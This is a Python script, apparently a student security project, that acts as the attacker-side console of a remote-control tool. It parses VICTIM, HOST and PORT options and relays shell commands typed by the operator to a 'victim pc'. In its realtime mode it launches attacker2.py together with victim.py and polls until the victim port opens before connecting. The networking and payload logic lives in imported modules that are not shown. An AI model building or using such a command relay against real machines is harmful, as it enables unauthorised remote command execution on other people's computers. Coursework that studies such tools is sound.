#Imports required for this file
import socket
import os
import subprocess
from attacker2 import notReal
from attacker import real

#Greeting message and syntax explanation
print("\n                            ---- WELCOME ----")
print("                syntax: 2ic80 [-r -v VICTIM] -h HOST [-p PORT]")

#Function that asks for a new command to execute
def getCommand():
	#Receives command and splits it in order to be validated
	command = input("\n~ $: ").split()
	#Validates command and gets important variables from them
	VICTIM, HOST, PORT = checkValidityCommand(command)

	#Returns variables for later use
	return VICTIM, HOST, PORT, checkRealtime(command)

#Checks whether the command indicates that realtime mode has to be enabled
def checkRealtime(command):
	if command[1] == "-r":
		return True
	else:
		return False

#Checks whether the inputted command is valid
def checkValidityCommand(command):
	#Standard values for VICTIM and PORT
	VICTIM = "127.0.0.0"
	PORT = 1024

	#Checks if command in non-null
	if len(command) == 0:
		print("general: wrong length")
		main()

	#Special command indicating the application has to be closed
	if command[0] == "exit()":
		exit()

	#Checks whether the length of the command is correct based on what options are enabled
	if "-r" in command and "-p" in command and len(command) == 8:
		VICTIM = command[3]
		HOST = command[5]
		PORT = command[7]
	elif "-r" in command and "-p" not in command and len(command) == 6:
		VICTIM = command[3]
		HOST = command[5]
	elif "-r" not in command and "-p" in command and len(command) == 4:
		HOST = command[2]
		PORT = command[4]
	elif "-r" not in command and "-p" not in command and len(command) == 3:
		HOST = command[2]
	else:
		print("general: wrong length")
		getCommand()

	#Checks whether HOST is of valid format
	try:
		#TODO check validity ip
		pass
	except:
		print("-h: wrong format")
		getCommand()

	#Checks whether PORT is of valid format
	try:
		PORT = int(PORT)
	except:
		print("-p: wrong format")
		getCommand()

	#Returns variables for later use
	return VICTIM, HOST, PORT

#Checks whether the victim socket is open
def checkSocketOpen(VICTIM, PORT):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	return sock.connect_ex((VICTIM, PORT))

def main():
	#getCommand() is called to initalize variables
	VICTIM, HOST, PORT, realtime = getCommand()

	#When realtime is not enabled, asks for input and relays it to the victim pc
	if realtime == False:
		action = input("enter command to relay ~ $: ")
		notReal(HOST, PORT, action)
		#Ask for new command
		main()
	#When realtime is enabled
	elif realtime == True:
		#Open a new terminal and make the victim pc open a port
		subprocess.run(['gnome-terminal', '-x', 'python3', 'attacker2.py', HOST, str(PORT), "python3 victim.py"])

		#Waits until the victim port is open
		while checkSocketOpen(VICTIM, PORT) != 0:
			pass

		#Starts a realtime connection with the victim
		if checkSocketOpen(VICTIM, PORT) == 0:
			real(VICTIM, PORT)
			#Ask for new command when realtime connection is exited
			main()
		else:
			main()

#Run main loop
main()
